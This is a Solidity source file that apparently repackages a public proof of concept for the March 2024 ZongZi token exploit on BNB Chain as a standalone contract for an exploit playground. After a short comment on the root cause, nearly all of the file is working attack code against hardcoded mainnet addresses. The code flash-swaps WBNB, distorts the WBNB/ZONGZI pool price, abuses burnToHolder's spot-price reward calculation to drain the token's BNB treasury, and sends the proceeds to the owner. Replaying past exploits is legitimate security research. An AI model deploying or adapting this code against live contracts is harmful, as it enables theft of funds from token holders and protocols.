// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-ZongZi).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest itself receives the PancakeSwap flash-swap callback via
// `pancakeCall`), so there is no standalone exploit contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit + pancakeCall + the Helper contract's exploit()) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/ZongZi_exp.sol in the registry.
//
// Root cause: ZZF.burnToHolder() prices a "burn ZONGZI, get BNB" reward off
// the WBNB/ZONGZI pair's live spot reserves (getAmountsOut), and the reward
// ledger (ZZF.receiveRewards -> canRewards = balanceOf - burnAmount) is
// self-set by the very burnToHolder call the attacker just made. Flash-loan
// WBNB, crash the ZONGZI price against WBNB, burn ZONGZI at the inflated
// rate, and the ZONGZI token contract's own BNB treasury pays out the
// inflated "deserved" amount.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IZZF is IERC20 {
    function burnToHolder(uint256 amount, address _invitation) external;
    function receiveRewards(address to) external;
}

interface UniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface UniRouterV2 {
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

contract ZongZiDrain {
    IWETH private constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZONGZI = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    UniPairV2 private constant BUSDT_WBNB = UniPairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    UniPairV2 private constant WBNB_ZONGZI = UniPairV2(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
    UniRouterV2 private constant ROUTER = UniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // The historical attack contract's storage slot 9 held this multiplier
    // (read via vm.load in the original test). Hardcoded here since a
    // standalone synthetic exploit has no cheatcode access.
    uint256 private constant MULTIPLIER = 146;

    address private immutable owner_;

    constructor(address owner) {
        owner_ = owner;
    }

    // step 0: size and execute the flash-swap that kicks off the attack.
    function attack() external {
        uint256 pairWBNBBalance = WBNB.balanceOf(address(WBNB_ZONGZI));
        uint256 amount1Out = (pairWBNBBalance * MULTIPLIER) / ((pairWBNBBalance * 100) / address(ZONGZI).balance);

        BUSDT_WBNB.swap(0, amount1Out, address(this), abi.encode(uint8(1)));

        WBNB.transfer(owner_, WBNB.balanceOf(address(this)));
    }

    // step 1: PancakeSwap flash-swap callback — crash the ZONGZI price,
    // burn at the inflated rate, claim the reward, repay the flash loan.
    function pancakeCall(address, uint256, uint256 _amount1, bytes calldata) external {
        Helper helper = new Helper();
        WBNB.transfer(address(helper), _amount1);
        helper.exploit();

        ZONGZI.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ZONGZI);
        path[1] = address(WBNB);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZONGZI.balanceOf(address(this)), 0, path, address(this), block.timestamp + 86_400
        );
        WBNB.transfer(address(BUSDT_WBNB), (_amount1 * 10_026) / 10_000);
    }

    receive() external payable {}
}

contract Helper {
    IWETH private constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZONGZI = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    IZZF private constant ZZF = IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);
    UniRouterV2 private constant ROUTER = UniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // step 2: distort the WBNB/ZONGZI pool price, then burn ZONGZI against
    // the router's getAmountsIn quote at the inflated spot price — this is
    // the vulnerable read (burnToHolder -> getAmountsOut off live reserves).
    function exploit() external {
        WBNB.approve(address(ROUTER), type(uint256).max);
        ZONGZI.approve(address(ROUTER), type(uint256).max);
        uint256 balanceBeforeWBNB = WBNB.balanceOf(address(this));

        makeSwap(1e17, address(WBNB), address(ZONGZI));
        makeSwap(ZONGZI.balanceOf(address(this)), address(ZONGZI), address(WBNB));

        uint256 amountIn = balanceBeforeWBNB - 1e17;
        makeSwap(amountIn, address(WBNB), address(ZONGZI));

        uint256 amountOut = address(ZONGZI).balance - 1e9;
        address[] memory path = new address[](2);
        path[0] = address(ZONGZI);
        path[1] = address(WBNB);
        uint256[] memory amounts = ROUTER.getAmountsIn(amountOut, path);

        ZZF.burnToHolder(amounts[0], msg.sender);
        ZZF.receiveRewards(address(this));

        makeSwap(ZONGZI.balanceOf(address(this)), address(ZONGZI), address(WBNB));

        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    function makeSwap(uint256 amountIn, address tokenA, address tokenB) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 86_400
        );
    }

    receive() external payable {}
}
